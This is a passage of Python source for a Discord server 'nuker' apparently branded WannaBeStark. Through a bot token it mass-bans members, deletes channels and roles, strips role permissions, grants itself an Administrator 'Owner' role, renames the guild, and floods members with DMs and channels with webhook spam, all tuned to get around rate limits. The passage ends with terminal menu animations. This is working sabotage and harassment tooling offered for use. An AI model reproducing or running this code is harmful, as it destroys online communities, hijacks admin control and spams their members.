                    print(format_log_message("SUCCESS", f"Message sent to {webhook_url}", 50))
                    return True
                elif resp.status_code == 429:
                    try:
                        retry_after = (resp.json()).get("retry_after", 1.0)
                    except httpx.HTTPError:
                        retry_after = 0.5
                    print(
                        format_log_message(
        "INFO",
        f"Rate limited. Delaying for {retry_after}s",
        50))
                    await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to send message to {webhook_url} - Status: {resp.status_code}",
        50))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Exception while sending to {webhook_url}: {e}",
        50))
                return False

    async def _fetch_image_as_base64(self, url):
        try:
            session = await self._get_session()
            response = await session.get(url)
            if response.status_code == 200:
                image_bytes = response.content
                encoded_string = base64.b64encode(
                        image_bytes).decode('utf-8')
                return f"data:{response.headers['Content-Type']};base64,{encoded_string}"
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to fetch avatar URL: {e}",
        40))
        return None


    async def _send_dm(self, member_id: str, message: str, token: str):
        if member_id in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"Skipping whitelisted member {member_id} (DM)",
        41))
            return None

        async with self.semaphore:

            try:
                session = await self._get_session()

                dm_resp = await session.post(
                    f"https://discord.com/api/v10/users/@me/channels",
                    headers={"Authorization": f"Bot {token}"}, json={"recipient_id": member_id}
                )
                if dm_resp.status_code == 200:
                    dm_channel = dm_resp.json()

                    msg_resp = await session.post(
                            f"https://discord.com/api/v10/channels/{dm_channel['id']}/messages",
                            headers={"Authorization": f"Bot {token}"}, json={"content": message}
                        )
                    if msg_resp.status_code == 200:
                        print(
                            format_log_message(
        "SUCCESS",
        f"DM sent to {member_id}",
        45))
                        return True
                    else:

                        print(
                            format_log_message(
        "ERROR",
        f"Failed to send DM to {member_id} (Status: {msg_resp.status_code})",
        35))
                        return False
                else:

                    print(
                        format_log_message(
        "ERROR",
        f"Failed to open DM with {member_id} (Status: {dm_resp.status_code})",
        35))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Exception while DMing {member_id}: {e}",
        35))
                return False

    async def execute_dm_all(self, token: str):
        default_dm = __config__.get("operations", {}).get(
            "dm_message", "@everyone WannaBeStark Nuked This Server!")
        message = await self.async_input(format_log_message("INPUT", f"DM message (default: {default_dm})", 50))
        if not message.strip():
            message = default_dm

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(
                format_log_message(
        "ERROR",
        "members.txt not found. Fetch first.",
        29))
            return 0
        count = 0
        for member in members:
            if member in self.whitelist:
                print(
                    format_log_message(
        "INFO",
        f"Skipping whitelisted member {member} (DM)",
        41))
                continue

        tasks = [self._send_dm(member, message, token) for member in members]
        results = await asyncio.gather(*tasks)
        return sum(1 for r in results if r is True)

    async def execute_unban_all(self, token: str):
        choice = await self.async_input(format_log_message("INPUT", "Unban specific user ID, or 'all' for everyone? ", 50))
        choice = choice.strip().lower()
        unbanned_count = 0
        start_time = time.time()
        session = await self._get_session()

        if choice == "all":
            try:
                resp = await session.get(
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans",
                    headers={"Authorization": f"Bot {token}"}
                )
                if resp.status_code != 200:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to fetch ban list (status {resp.status_code})",
        45))
                    await asyncio.sleep(2.5)
                    return 0
                bans = resp.json()
                if not bans:
                    print(
                        format_log_message(
        "INFO",
        "No banned members found in this server.",
        45))
                    await asyncio.sleep(2.5)
                    return 0
                print(
                    format_log_message(
        "INFO",
        f"Found {len(bans)} banned users. Starting mass unban...",
        48))
                banned_ids = [ban['user']['id'] for ban in bans]
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Error fetching bans: {e}",
        42))
                await asyncio.sleep(2.5)
                return 0

            tasks = []
            for user_id in banned_ids:
                if user_id in self.whitelist:
                    print(
                        format_log_message(
        "INFO",
        f"Skipping whitelisted user {user_id} (unban)",
        45))
                    continue
                tasks.append(self._execute_single_unban(user_id, token))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            unbanned_count = sum(1 for r in results if r is True)

        else:
            if not choice.isdigit():
                print(
                    format_log_message(
        "ERROR",
        "Invalid input | must be a user ID (numbers) or 'all'",
        48))
                await asyncio.sleep(2.0)
                return 0
            user_id = choice
            success = await self._execute_single_unban(user_id, token)
            unbanned_count = 1 if success else 0

        duration = time.time() - start_time

        if unbanned_count > 0:
            print(
                format_log_message(
        "SUCCESS",
        f"Unbanned {unbanned_count} user(s) in {duration:.2f}s",
        45))
        else:
            print(
                format_log_message(
        "INFO",
        f"No users were unbanned ({duration:.2f}s)",
        42))

        await asyncio.sleep(3.0)

        return unbanned_count

    async def _execute_single_unban(self, user_id: str, token: str) -> bool:
        async with self.semaphore:
            for attempt in range(3):
                try:
                    resp = await (await self._get_session()).delete(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/bans/{user_id}",
                        headers={"Authorization": f"Bot {token}"}
                    )
                    if resp.status_code in (200, 204, 404):
                        print(
                            format_log_message(
        "SUCCESS",
        f"Unbanned {user_id}",
        50))
                        return True
                    elif resp.status_code == 429:
                        try:
                            data = resp.json()
                            retry_after = data.get("retry_after", 1.0)
                        except BaseException:
                            retry_after = 1.0
                        print(
                            format_log_message(
        "INFO",
        f"Rate limited | waiting {retry_after:.1f}s for {user_id}",
        45))
                        await asyncio.sleep(retry_after + random.uniform(0.1, 0.5))
                        continue
                    elif resp.status_code == 403:
                        text = resp.text
                        if "Missing Permissions" in text:
                            print(
                                format_log_message(
        "ERROR",
        "Missing ban permissions | stopping",
        42))
                            await asyncio.sleep(2.5)
                            return False
                        else:
                            print(
                                format_log_message(
        "ERROR",
        f"Forbidden: {text[:80]}...",
        45))
                            await asyncio.sleep(2.5)
                            return False
                    else:
                        print(
                            format_log_message(
        "ERROR",
        f"Failed to unban {user_id} (status {resp.status_code})",
        48))
                        await asyncio.sleep(2.0)
                        return False
                except Exception as e:
                    print(
                        format_log_message(
        "ERROR",
        f"Exception unbanning {user_id}: {e}",
        42))
                    await asyncio.sleep(2.0)
                    return False

            print(
                format_log_message(
        "ERROR",
        f"Failed to unban {user_id} after retries",
        45))
            await asyncio.sleep(2.5)
            return False

    async def execute_untimeout_all(self, token: str):
        async def untimeout_member(session, member_id):
            if str(member_id) in self.whitelist:
                print(
                    format_log_message(
        "INFO",
        f"Skipping whitelisted member {member_id} (Untimeout)",
        41))
                return False

            try:
                payload = {"communication_disabled_until": None}
                resp = await session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/members/{member_id}",
                    headers={"Authorization": f"Bot {token}"},
                    json=payload,
                )
                if resp.status_code in [200, 204]:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Removed timeout from member #{member_id}",
        40))
                    return True
                elif resp.status_code == 404:
                    print(
                        format_log_message(
        "INFO",
        f"Member {member_id} not found (404), skipping.",
        46))
                    return False
                elif resp.status_code == 429:
                    print(
                        format_log_message(
        "ERROR",
        f"Rate limited while untimeouting member #{member_id}",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to untimeout member #{member_id} - Status: {resp.status_code}",
        40))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to untimeout member #{member_id} | {e}",
        40))
                return False

        session = await self._get_session()

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(
                format_log_message(
        "ERROR",
        "members.txt not found. Fetch first.",
        29))
            return 0

        if not members:
            print(
                format_log_message(
        "INFO",
        "No members found in members.txt",
        40))
            return 0

        total_members = len(members)
        print(
            format_log_message(
        "INFO",
        f"Attempting to remove timeout from {total_members} members (max speed)...",
        40))

        tasks = [untimeout_member(session, member_id) for member_id in members]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        count = sum(1 for r in results if r is True)
        print(
            format_log_message(
        "SUCCESS",
        f"Finished: Removed timeout from {count}/{total_members} members.",
        40))
        time.sleep(2.5)
        return count


    async def execute_strip_perms(self, token: str):
        session = await self._get_session()
        try:
            resp = await session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                headers={"Authorization": f"Bot {token}"}
            )
            if resp.status_code != 200:
                print(
                    format_log_message(
        "ERROR",
        "Failed to fetch roles",
        45))
                return 0
            roles = resp.json()
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to fetch roles | {e}",
        45))
            return 0

        roles_to_strip = [r for r in roles if r['id'] != self.guildid]
        print(
            format_log_message(
        "INFO",
        f"Stripping permissions from {len(roles_to_strip)} roles (BURST SPEED)...",
        45))

        async def strip_role(role_id):
            payload = {"permissions": "0"}
            try:
                resp = await session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role_id}",
                    headers={"Authorization": f"Bot {token}"}, json=payload, timeout=httpx.Timeout(5)
                )
                if resp.status_code == 200:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Stripped perms from role #{role_id}",
        45))
                    return True
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to strip perms from role #{role_id}",
        45))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to strip role #{role_id} | {e}",
        45))
                return False

        tasks = [strip_role(role['id']) for role in roles_to_strip]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        count = sum(1 for r in results if r is True)
        print(
            format_log_message(
        "SUCCESS",
        f"Stripped permissions from {count}/{len(roles_to_strip)} roles",
        45))
        time.sleep(2.5)
        return count

    async def execute_auto_admin(self, token: str, user_id: str = None):
        if user_id is None:
            user_id = str(__bot_user_id__)
        if user_id in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"Skipping whitelisted user {user_id}",
        35))
            return False
        async with self.semaphore:
            try:
                session = await self._get_session()
                resp = await session.post(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"},
                    json={
    "name": "Owner",
    "permissions": "8",
     "color": 0xFF0000}
                )
                if resp.status_code == 429:
                    return await self.execute_auto_admin(token, user_id)
                if resp.status_code != 200:
                    print(
                        format_log_message(
        "ERROR",
        "Failed to create admin role",
        45))
                    return False
                role_data = resp.json()
                role_id = role_data['id']
                print(
                    format_log_message(
        "SUCCESS",
        f"Created admin role #{role_id}",
        45))
                roles_resp = await session.get(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                    headers={"Authorization": f"Bot {token}"}
                )
                if roles_resp.status_code == 200:
                    all_roles = roles_resp.json()
                    bot_member_resp = await session.get(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/members/{__bot_user_id__}",
                            headers={"Authorization": f"Bot {token}"}
                        )
                    if bot_member_resp.status_code == 200:
                        bot_data = bot_member_resp.json()
                        bot_role_ids = bot_data.get('roles', [])
                        bot_roles = [
    r for r in all_roles if r['id'] in bot_role_ids]
                        if bot_roles:
                            highest_bot_pos = max(
                                        r['position'] for r in bot_roles)
                            target_pos = max(1, highest_bot_pos - 1)
                            payload = [
                                        {"id": role_id, "position": target_pos}]
                            await session.patch(
                                        f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                                        headers={
    "Authorization": f"Bot {token}"},
                                        json=payload
                                    )
                            print(
                                format_log_message(
        "SUCCESS",
        f"Moved role to position {target_pos}",
        45))
                assign_resp = await session.put(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/members/{user_id}/roles/{role_id}",
                    headers={"Authorization": f"Bot {token}"}
                )
                if assign_resp.status_code in [200, 204]:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Assigned admin to {user_id}",
        45))
                    return True
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to assign role to {user_id}",
        45))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Auto admin failed: {e}",
        45))
                return False

    async def execute_rename_emojis(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New emoji name (use {i})", 50))
        session = await self._get_session()
        resp = await session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
            headers={"Authorization": f"Bot {token}"}
        )
        if resp.status_code != 200:
            return 0
        emojis = resp.json()
        count = 0
        for i, emoji in enumerate(emojis):
            name = new_name.format(i=i)
            payload = {"name": name}
            async with self.semaphore:
                resp = await session.patch(
                    f"https://discord.com/api/v10/guilds/{self.guildid}/emojis/{emoji['id']}",
                    headers={"Authorization": f"Bot {token}"}, json=payload
                )
                if resp.status_code == 200:
                    count += 1
        return count

    async def execute_unick_all_fast(self, token: str):
        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()
                                    and line.strip().isdigit()]
        except BaseException:
            print(
                format_log_message(
        "ERROR",
        "members.txt missing or empty",
        40))
            return 0

        members = [m for m in members if m not in self.whitelist]
        total = len(members)

        if total == 0:
            print(
                format_log_message(
        "INFO",
        "No members to un-nick after whitelist filter",
        45))
            return 0

        print(
            format_log_message(
        "INFO",
        f"Starting un-nick all  ({total} targets)",
        50))

        success_count = 0

        async def unick_one(member_id: str):
            nonlocal success_count
            async with self.semaphore:
                try:
                    session = await self._get_session()
                    resp = await session.patch(
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                        headers={"Authorization": f"Bot {token}"},
                        json={"nick": None},
                    )
                    if resp.status_code in (200, 204):
                        success_count += 1
                        print(
                                f"{format_log_message('SUCCESS', f'Unnicked ? {member_id}', 52)}")
                    elif resp.status_code == 429:
                        try:
                            data = resp.json()
                            await asyncio.sleep(data.get("retry_after", 0.7) + random.uniform(0.1, 0.4))
                        except BaseException:
                            await asyncio.sleep(0.9)
                        retry = await session.patch(
                                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                                headers={"Authorization": f"Bot {token}"},
                                json={"nick": None},
                            )
                        if retry.status_code in (200, 204):
                            success_count += 1
                            print(
                                        f"{format_log_message('SUCCESS', f'Unnicked ? {member_id}', 52)}")
                except BaseException:
                    pass

        start_time = time.time()
        await asyncio.gather(*(unick_one(mid) for mid in members), return_exceptions=True)
        duration = time.time() - start_time

        print(
            format_log_message(
        "SUCCESS",
        f"Finished: {success_count}/{total} members un-nicked in {duration:.2f}s",
        55))
        time.sleep

        return success_count

    async def execute_guild_info(self, token: str):
        guild_id = await self.async_input(format_log_message("INPUT", "Enter the guild ID to fetch info for", 50))
        if not guild_id.isdigit():
            print(format_log_message("ERROR", "Invalid guild ID.", 40))
            return

        session = await self._get_session()
        try:
            resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}", headers={"Authorization": f"Bot {token}"})
            if resp.status_code != 200:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to fetch guild {guild_id}",
        40))
                return
            guild = resp.json()

            owner_id = guild.get('owner_id')
            owner_name = "N/A"
            if owner_id:
                user_resp = await session.get(f"https://discord.com/api/v10/users/{owner_id}", headers={"Authorization": f"Bot {token}"})
                if user_resp.status_code == 200:
                    owner_data = user_resp.json()
                    owner_name = f"{owner_data.get('username')}#{owner_data.get('discriminator')}"

            resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}/channels", headers={"Authorization": f"Bot {token}"})
            channels = resp.json() if resp.status_code == 200 else []
            resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}/roles", headers={"Authorization": f"Bot {token}"})
            roles = resp.json() if resp.status_code == 200 else []
            resp = await session.get(f"https://discord.com/api/v10/guilds/{guild_id}/emojis", headers={"Authorization": f"Bot {token}"})
            emojis = resp.json() if resp.status_code == 200 else []

            vanity_code = guild.get('vanity_url_code') or "None"
            creation_date = datetime.utcfromtimestamp(((int(guild['id']) >> 22) + 1420070400000) / 1000.0).strftime("%Y-%m-%d %H:%M:%S")

            info = [
                ("Guild Name", guild.get('name')),
                ("Guild ID", guild.get('id')),
                ("Owner", f"{owner_name} ({owner_id})"),
                ("Created At", creation_date),
                ("Members", guild.get('approximate_member_count', 'N/A')),
                ("Vanity URL", vanity_code),
                ("Total Channels", len(channels)),
                ("Total Roles", len(roles)),
                ("Total Emojis", len(emojis)),
            ]

            mode_start, mode_end = get_mode_colors()
            print(
    gradient_text(
        "?" + "-" * 60 + "?",
        mode_start,
        mode_end,
        bold=True))
            for key, value in info:
                print(
    gradient_text(
        f"| {key:<20} | {str(value):<35} |",
        mode_start,
        mode_end,
        bold=True))
            print(
    gradient_text(
        "?" + "-" * 60 + "?",
        mode_start,
        mode_end,
        bold=True))

        except Exception as e:
            print(format_log_message("ERROR", f"An error occurred: {e}", 40))

    async def execute_nuke_all(self, token: str):
        print(
            format_log_message(
        "INFO",
        "Starting FULL NUKE - WIZZLER / DEADLIZER RUNS CORD...",
        40))

        nuke_config = __config__.get("nuke_all", {})

        session = await self._get_session()

        channels_resp = await session.get(
            f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
            headers={"Authorization": f"Bot {token}"}
        )
        channels = channels_resp.json() if channels_resp.status_code == 200 else []

        tasks = []

        if nuke_config.get("ban_members", True):
            try:
                with open("fetched/members.txt", "r") as f:
                    members = [
    line.strip() for line in f if line.strip() and line.strip().isdigit()]
                print(
                    format_log_message(
        "INFO",
        f"Preparing to ban {len(members)} members...",
        45))
                for member in members:
                    if member not in self.whitelist:
                        tasks.append(self.execute_ban(member, token))
            except FileNotFoundError:
                print(
                    format_log_message(
        "INFO",
        "members.txt not found ? skipping mass ban",
        45))
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Error preparing ban list: {e}",
        45))

        if nuke_config.get("delete_channels", True):
            print(
                format_log_message(
        "INFO",
        f"Deleting {len(channels)} channels...",
        45))
            for ch in channels:
                tasks.append(self.execute_delchannels(ch['id'], token))

        if nuke_config.get("create_roles", True):
            print(
                format_log_message(
        "INFO",
        "Mass creating 60 new roles...",
        45))
            for _ in range(60):
                role_name = random.choice(__config__["nuke"]["roles_name"])
                tasks.append(self.execute_creroles(role_name, token))

        if nuke_config.get("change_guild_name", True):
            guild_name = __config__.get(
    "operations", {}).get(
        "guild_name", "Wizzed By WannaBeStark")
            tasks.append(
    self.execute_change_guild_info(
        token,
        new_name=guild_name,
        new_desc=""))

        if nuke_config.get("create_channels", True):
            print(
                format_log_message(
        "INFO",
        "Mass creating 75 new text channels...",
        45))
            for _ in range(75):
                ch_name = random.choice(__config__["nuke"]["channel_names"])
                tasks.append(
    self.execute_crechannels(
        ch_name, 0, token))

        if nuke_config.get("spam_webhooks", True) or nuke_config.get(
            "create_channels", True):
            print(
                format_log_message(
        "INFO",
        "Starting final spam phase (webhooks + channel messages)...",
        45))
            tasks.append(self.execute_webhook_spam(token))
            tasks.append(self.execute_spam_all_channels(token))

        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        print(
            format_log_message(
        "SUCCESS",
        "FULL NUKE FINISHED | roles & emojis preserved + mass created!",
        45))
        return True

    async def execute_delchannels_all(self, token: str):
        session = await self._get_session()
        resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                headers={"Authorization": f"Bot {token}"})
        channels = resp.json() if resp.status_code == 200 else []
        for ch in channels:
            await self.execute_delchannels(ch['id'], token)

    async def execute_delroles_all(self, token: str):
        session = await self._get_session()
        resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                                headers={"Authorization": f"Bot {token}"})
        roles = resp.json() if resp.status_code == 200 else []
        roles_to_delete = [role['id'] for role in roles if role['id'] != self.guildid]

        print(format_log_message("INFO", f"Deleting {len(roles_to_delete)} roles | retrying until all gone...", 45))
        start_time = time.time()

        client = httpx.AsyncClient(
            limits=httpx.Limits(max_connections=__max_concurrent__, max_keepalive_connections=max(10, __max_concurrent__)),
            timeout=httpx.Timeout(10.0),
            verify=False
        )
        sem = asyncio.Semaphore(__max_concurrent__)
        success_count = 0

        async def del_role(role_id):
            nonlocal success_count
            async with sem:
                while True:
                    try:
                        r = await client.delete(
                            f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role_id}",
                            headers={"Authorization": f"Bot {token}"}
                        )
                        if r.status_code in (200, 204):
                            success_count += 1
                            print(format_log_message("SUCCESS", f"Deleted role {role_id}", 45))
                            return True
                        elif r.status_code == 429:
                            try:
                                retry_after = float(r.json().get("retry_after", 0.5))
                            except Exception:
                                retry_after = 0.5
                            await asyncio.sleep(retry_after)
                        elif r.status_code == 404:
                            return True  # already gone
                        else:
                            print(format_log_message("ERROR", f"Role {role_id} ({r.status_code}): {r.text[:60]}", 40))
                            return False
                    except Exception:
                        await asyncio.sleep(0.5)

        await asyncio.gather(*[del_role(rid) for rid in roles_to_delete])
        await client.aclose()
        duration = time.time() - start_time
        print(format_log_message("SUCCESS", f"Deleted {success_count}/{len(roles_to_delete)} roles in {duration:.2f}s", 45))
        return success_count

    async def execute_delemojis_all(self, token: str):
        session = await self._get_session()
        resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/emojis",
                                headers={"Authorization": f"Bot {token}"})
        emojis = resp.json() if resp.status_code == 200 else []
        for emoji in emojis:
            await self.execute_delemojis(emoji['id'], token)

    async def execute_get_invite(self, token: str):
        try:
            platform = await self.async_input(format_log_message("INPUT", "Platform: [w]indows/[m]obile", 32))
            if platform == "MODE_SWITCHED":
                return
            platform = platform.strip().lower()

            session = await self._get_session()
            resp = await session.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                headers={"Authorization": f"Bot {token}"}
            )
            if resp.status_code == 200:
                channels = resp.json()
                if not channels:
                    print(format_log_message("ERROR", "No channels found to create an invite!", 45))
                    return

                ch_id = channels[0]['id']
                inv_resp = await session.post(
                        f"https://discord.com/api/v10/channels/{ch_id}/invites",
                        headers={"Authorization": f"Bot {token}"},
                        json={"max_age": 0, "max_uses": 0}
                    )
                if inv_resp.status_code == 200:
                    invite_data = inv_resp.json()
                    invite_link = f"https://discord.gg/{invite_data.get('code')}"

                    if platform == 'm':
                        print(
                            format_log_message(
        "SUCCESS",
        f"Invite Link: {invite_link}",
        45))
                        print(
                            format_log_message(
        "INFO", "Displaying for 7 seconds...", 45))
                        await asyncio.sleep(7)
                    else:
                        copied = _clipboard_copy(invite_link)
                        if copied:
                            print(
                                format_log_message(
            "SUCCESS",
            "Invite Link copied to clipboard!",
            45))
                        else:
                            print(
                                format_log_message(
            "INFO",
            f"Clipboard unavailable. Invite: {invite_link}",
            45))
                else:
                    print(
                        format_log_message(
        "ERROR",
        "Failed to create invite.",
        45))
            else:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to fetch channels (Status: {resp.status_code})",
        45))
        except Exception as e:
            print(format_log_message("ERROR", f"Error in get_invite: {e}", 45))

    async def _deadlizer_menu_load_1(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 1: Eclipsing Shadow"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 25
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    # Shadow opens from center outwards
                    center_dist = abs(c_idx - (len(line)/2)) / max(len(line)/2, 1)
                    reveal = (t * 2.0) - center_dist
                    
                    if reveal > 0:
                        h_blend = c_idx / max(len(line)-1, 1)
                        cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                        cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                        cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                        fade = min(1.0, reveal)
                        if reveal < 0.2:
                            out += f"\033[38;2;150;0;0m{random.choice('▓▒░')}" # Blood edge
                        else:
                            out += f"\033[1m\033[38;2;{int(cr*fade)};{int(cg*fade)};{int(cb*fade)}m{ch}"
                    else:
                        out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")

    async def _deadlizer_menu_load_2(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 2: Toxic Spore Bloom"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 30
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    
                    bloom_chance = t * 1.5
                    if random.random() < bloom_chance:
                        h_blend = c_idx / max(len(line)-1, 1)
                        cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                        cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                        cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                        out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch}"
                    else:
                        if random.random() < 0.2 * t:
                            out += f"\033[38;2;{random.randint(150,255)};{random.randint(0,50)};{random.randint(0,50)}m."
                        else:
                            out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")

    async def _deadlizer_menu_load_3(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 3: Chains & Fire Reveal"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 30
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                for c_idx, ch in enumerate(line):
                    if ch == " ":
                        out += " "
                        continue
                    
                    # Fire from bottom
                    fire_thresh = 1.0 - (t * 1.5)
                    row_pct = r_idx / max(total_lines-1, 1)
                    
                    if row_pct >= fire_thresh:
                        h_blend = c_idx / max(len(line)-1, 1)
                        cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                        cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                        cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                        out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch}"
                    else:
                        if random.random() < 0.1 and row_pct < fire_thresh + 0.2:
                            out += f"\033[38;2;255;100;0m{random.choice('^~*')}" # Sparks
                        elif random.random() < 0.05:
                            out += f"\033[38;2;100;100;100m|" # Phantom chains
                        else:
                            out += " "
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")

    async def _deadlizer_menu_load_4(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """DEADLIZER MENU 4: Crimson Tear"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 25
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
                pad = max((console_width - len(line)) // 2, 0)
                out += " " * pad
                
                # Tear shifts lines horizontally randomly at first
                shift = int((1.0 - t) * random.randint(-4, 4))
                shifted_line = " " * max(0, -shift) + line[max(0, shift):] + " " * max(0, shift)
                
                for c_idx, ch in enumerate(shifted_line):
                    if c_idx >= len(line): break
                    if ch == " " and line[c_idx] == " ":
                        out += " "
                        continue
                    
                    if t > 0.3:
                        actual_c = c_idx
                        ch_final = line[actual_c]
                        if ch_final == " ":
                             out += " "
                             continue
                        h_blend = actual_c / max(len(line)-1, 1)
                        cr = int(mode_start[0]*(1-h_blend) + mode_end[0]*h_blend)
                        cg = int(mode_start[1]*(1-h_blend) + mode_end[1]*h_blend)
                        cb = int(mode_start[2]*(1-h_blend) + mode_end[2]*h_blend)
                        
                        if random.random() > t:
                            out += f"\033[1m\033[38;2;255;0;0m{ch_final}"
                        else:
                            out += f"\033[1m\033[38;2;{cr};{cg};{cb}m{ch_final}"
                    else:
                        out += f"\033[1m\033[38;2;255;0;0m{ch}"
                        
                sys.stdout.write(out + "\033[0m\n")
            sys.stdout.flush()
            await asyncio.sleep(0.04)
        skipper.stop()
        if skipper.should_skip: os.system("cls") if os.name == "nt" else os.system("clear")


    async def _wizzler_menu_load_1(self, banner_lines, info_lines, options_raw, mode_start, mode_end, console_width):
        """WIZZLER MENU 1: Digital Matrix Reveal"""
        import sys, math, random, time, asyncio
        os.system("cls") if os.name == "nt" else os.system("clear")
        skipper = _AnimationSkipper(required_presses=2)
        skipper.start()

        full_text = banner_lines + info_lines + options_raw.split('\n')
        total_lines = len(full_text)
        
        frames = 25
        for frame in range(frames):
            if skipper.should_skip: break
            sys.stdout.write("\033[H")
            t = frame / frames
            
            for r_idx, line in enumerate(full_text):
                out = ""
